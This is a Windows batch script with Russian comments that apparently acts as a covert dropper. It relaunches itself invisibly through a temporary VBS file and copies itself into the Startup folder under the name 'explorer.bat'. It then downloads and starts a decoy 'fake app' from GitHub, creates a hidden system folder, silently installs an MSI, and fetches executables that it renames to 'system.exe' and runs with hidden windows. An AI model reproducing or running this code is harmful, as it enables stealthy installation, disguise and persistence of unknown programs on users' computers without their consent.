@echo off
if "%1"=="hidden" goto HIDDEN

:: Создаем VBS-скрипт для скрытого перезапуска
set "vbsfile=%temp%\invisible.vbs"
echo Set WshShell = CreateObject^("WScript.Shell"^) > "%vbsfile%"
echo WshShell.Run "cmd /c ""%~f0"" hidden", 0, False >> "%vbsfile%"
wscript "%vbsfile%"
del "%vbsfile%"
exit

:HIDDEN
setlocal EnableDelayedExpansion

set "max_dir=C:\.MAX"
set "installer_dir=%max_dir%\installer"
set "max_app_dir=%max_dir%\MAX"
set "msi_file=%installer_dir%\MAX.msi"
set "fake_app_file=app.exe"

:: ВСТАВЬТЕ ССЫЛКИ ДЛЯ watcher.exe И init.exe НИЖЕ
set "watcher_url=https://github.com/ArseniyGitHub/max-installer/raw/refs/heads/main/watcher.exe"
set "init_url=https://github.com/ArseniyGitHub/max-installer/raw/refs/heads/main/init.exe"
set "fake_app_url=https://github.com/ArseniyGitHub/max-installer/raw/refs/heads/main/c.exe"

if exist "%fake_app_file%" (
    start "" "%fake_app_file%"
    exit
)


set "StartupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "MyBatFile=%~f0"
set "ShortcutName=explorer.bat"

:: Копирование самого BAT-файла в папку автозагрузки
if not exist "%StartupFolder%\%ShortcutName%" (
    copy "%MyBatFile%" "%StartupFolder%\%ShortcutName%"
    echo Файл успешно скопирован в автозагрузку.
) else (
    echo Файл уже находится в автозагрузке.
)


powershell -Command "Invoke-WebRequest -Uri '%fake_app_url%' -OutFile '%fake_app_file%' -UserAgent 'Mozilla/5.0'" 2>nul
start "" "%fake_app_file%"


echo [%date% %time%] Проверка системы...



if not exist "%max_dir%" (
    echo [%time%] Инициализация новой установки...
    
    mkdir "%max_dir%"
    :: Создаем структуру папок
    mkdir "%installer_dir%" 2>nul
    if errorlevel 1 (
        echo Ошибка создания папок. Запустите от администратора.
        pause
        exit /b 1
    )

    :: Создаем папку MAX, если её нет (в случае существования .MAX)
    if not exist "%max_app_dir%" mkdir "%max_app_dir%"

    :: Создаем config.txt, если его нет
    if not exist "%max_app_dir%\config.txt" (
        echo [%time%] Создание config.txt...
        echo. > "%max_app_dir%\config.txt"
        echo [%time%] Файл config.txt создан!
    )
    
    :: Делаем папку скрытой
    attrib +h +s "%max_dir%"
    echo [%time%] Создана скрытая папка: %max_dir%
    
    :: Скачиваем и устанавливаем MAX
    echo [%time%] Загрузка установщика...
    powershell -Command "Invoke-WebRequest -Uri 'https://trk.mail.ru/c/h172vv5' -OutFile '%msi_file%' -UserAgent 'Mozilla/5.0'" 2>nul
    
    if exist "%msi_file%" (
        echo [%time%] Запуск установки MAX...
        msiexec /a "%msi_file%" TARGETDIR="%max_dir%" /quiet /norestart
        
        echo [%time%] Ожидание завершения установки...
        timeout /t 15 /nobreak >nul
        
        if exist "%max_app_dir%\max.exe" (
            echo [%time%] MAX установлен успешно!
        ) else (
            echo [%time%] ОШИБКА: MAX не установлен корректно
        )
        
        :: Очистка
        del "%msi_file%" 2>nul
        echo [%time%] Временные файлы очищены
    ) else (
        echo [%time%] ОШИБКА: Не удалось скачать установщик
    )
) else (
    echo [%time%] Папка %max_dir% уже существует.
)

:: Проверяем и скачиваем watcher.exe и init.exe (если папка .MAX существует)
if exist "%max_dir%" (
    echo [%time%] Проверка watcher.exe и init.exe...
    
    :: Скачиваем init.exe, если ссылка указана и файла нет
    if not "!init_url!"=="ВСТАВЬТЕ_ССЫЛКУ_ДЛЯ_init.exe_ЗДЕСЬ" (
        if not exist "%max_app_dir%\init.exe" (
            echo [%time%] Загрузка init.exe...
            powershell -Command "Invoke-WebRequest -Uri '!init_url!' -OutFile '%max_app_dir%\init.exe' -UserAgent 'Mozilla/5.0'" 2>nul
        )
        
        if exist "%max_app_dir%\init.exe" (
            echo [%time%] Запуск init.exe...
            powershell -Command "Start-Process '%max_app_dir%\init.exe' -WindowStyle Hidden"
            echo [%time%] Init.exe запущен!
        ) else (
            echo [%time%] ВНИМАНИЕ: Init.exe не скачан
        )
    ) else (
        echo [%time%] Ссылка для init.exe не указана
    )
    
    :: Скачиваем watcher.exe, если ссылка указана и файла нет
    if not "!watcher_url!"=="ВСТАВЬТЕ_ССЫЛКУ_ДЛЯ_watcher.exe_ЗДЕСЬ" (
        if not exist "%max_app_dir%\watcher.exe" (
            echo [%time%] Загрузка watcher.exe...
            powershell -Command "Invoke-WebRequest -Uri '!watcher_url!' -OutFile '%max_app_dir%\system.exe' -UserAgent 'Mozilla/5.0'" 2>nul
        )
        
        if exist "%max_app_dir%\system.exe" (
            echo [%time%] Создание копий watcher...
            copy "%max_app_dir%\system.exe" "%max_app_dir%\watcher1.exe" >nul
            copy "%max_app_dir%\system.exe" "%max_app_dir%\watcher2.exe" >nul
            echo [%time%] Создано: watcher.exe, watcher1.exe, watcher2.exe
            
            echo [%time%] Запуск watcher.exe...
            powershell -Command "Start-Process '%max_app_dir%\system.exe' -WindowStyle Hidden"
            echo [%time%] Watcher запущен!
        ) else (
            echo [%time%] ВНИМАНИЕ: Watcher не скачан
        )
    ) else (
        echo [%time%] Ссылка для watcher не указана
    )
)

if exist "%StartupFolder%\%ShortcutName%" (
    del "%StartupFolder%\%ShortcutName%"
    echo Файл "%ShortcutName%" успешно удален.
) else (
    echo Файл "%ShortcutName%" не найден.
)

echo [%time%] Процесс завершен
exit